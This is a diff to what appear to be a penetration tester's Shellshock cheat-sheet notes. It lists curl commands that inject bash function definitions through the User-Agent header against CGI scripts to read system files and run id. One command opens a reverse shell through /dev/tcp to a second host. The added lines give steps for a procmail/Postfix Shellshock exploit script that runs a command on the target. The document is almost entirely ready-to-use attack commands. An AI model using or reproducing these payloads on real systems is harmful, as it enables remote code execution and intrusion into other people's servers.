@@ -5,3 +5,8 @@ curl -A "() { :; }; echo 'Content-type: text/html'; echo; /bin/bash -c 'cat /etc
 curl -A "() { :; }; echo 'Content-type: text/html'; echo; /usr/bin/id;" http://192.168.57.101:591/cgi-bin/cat
 
 curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.0.101/1234 0>&1' http://192.168.0.102/cgi-bin/status
+
+#procmailrc shellshock
+1-have a valid send recepient
+2-Edit From and Send into exploit (34896 of exploit-db)
+python smtp_postfix.py 10.11.1.231 "ping -c 4 192.168.119.149"
